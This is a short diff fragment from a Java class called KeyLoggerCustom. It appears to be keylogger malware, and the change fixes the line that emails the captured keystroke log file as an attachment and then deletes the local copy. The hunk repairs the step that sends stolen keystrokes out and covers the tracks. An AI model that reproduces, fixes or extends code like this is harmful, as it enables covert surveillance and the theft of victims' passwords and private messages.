@@ -81,7 +81,7 @@ public class KeyLoggerCustom implements NativeKeyListener{
 				File fileApp=null;
 				try {
 					fileApp=new File(PATH+"logger/"+FILE_NAME);
-					sendMail.sendMailConAttachment(file);
+					sendMail.sendMailConAttachment(fileApp);
 					fileApp.delete();
 					
 				} catch (Exception e) {
